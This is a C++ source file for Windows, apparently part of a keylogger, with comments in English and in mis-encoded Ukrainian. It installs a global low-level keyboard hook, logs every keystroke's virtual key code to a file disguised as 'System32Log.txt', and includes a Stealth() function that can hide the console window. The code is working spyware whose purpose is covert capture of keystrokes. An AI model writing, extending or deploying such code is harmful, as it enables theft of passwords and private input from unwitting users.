#pragma once

#pragma comment(lib,"user32.lib")

#include "KeyLoggerModule.h"

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>

#pragma warning(disable:4996)
#pragma warning(disable:4703)

// визначаЇ, видиме в≥кно чи н≥
// маЇ бути вир≥шено за допомогою makefile, а не в цьому файл≥
#define visible // (visible / invisible)

// зм≥нна дл€ збер≥ганн€ HANDLE хука
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.

// ÷€ структура м≥стить дан≥, отриман≥ зворотним викликом хука. як ви бачите у функц≥њ зворотного виклику
// м≥стить те, що вам знадобитьс€: vkCode = код в≥ртуального ключа.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream OUTPUT_FILE("Logs/System32Log.txt", std::ios_base::app);

extern char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			KeyLogger::getInstance()->log(std::to_string(kbdStruct.vkCode));
		}
	}
	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.

	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif // invisible
}